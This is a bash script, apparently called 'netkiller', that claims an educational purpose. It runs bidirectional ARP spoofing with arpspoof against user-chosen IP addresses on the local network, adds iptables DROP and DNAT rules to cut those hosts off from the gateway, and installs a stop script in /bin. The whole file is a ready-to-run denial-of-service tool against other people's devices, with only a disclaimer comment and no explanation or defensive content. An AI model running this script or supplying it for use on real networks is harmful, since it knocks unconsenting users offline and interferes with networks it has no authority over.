#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    echo "Please re-run using: sudo $0 $*"
    exit 1
fi

# Detect Current Network Configuration
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
echo ""
echo "Current Network Configuration"
echo ""
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $IP"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Skip for default"
read -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Skip for default"
read -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Target IPs
echo "Enter Multiple Target IPs (comma-separated, e.g., 10.0.0.123,10.0.0.124):"
read -p "> " IPS
# If no input, prompt again or exit
if [ -z "$IPS" ]; then
    echo "No target IPs provided. Exiting."
    exit 1
fi
# Convert comma-separated IPs to space-separated for iteration
TARGET_IPS=$(echo "$IPS" | tr ',' ' ')
echo ""

# Detect Device IP
MYIP="$IP"

# Prompt configuration
echo "Your Target Configuration..."
echo ""
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGET IP: | $TARGET_IPS"
echo ""

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -t nat -F
iptables -F FORWARD

# Create stop script
cat > /bin/netkiller-stop << EOF
#!/bin/sh
iptables -t nat -F
iptables -F FORWARD
pkill -f arpspoof
echo "Restoring the Connections..."
EOF
chmod 755 /bin/netkiller-stop

# Iterate over each target IP
for TARGET in $TARGET_IPS; do
    # Validate IP format (basic check)
    if ! echo "$TARGET" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > /dev/null; then
        echo "Invalid IP address: $TARGET. Skipping."
        continue
    fi

    # Block all traffic of the target wifi clients
        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
        iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
    (
        # Bidirectional ARP Spoofing
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done

echo " "
echo "Netkiller Attack is running in the background...!!!"
echo ""
echo "To stop, run: sudo netkiller-stop"
echo " "
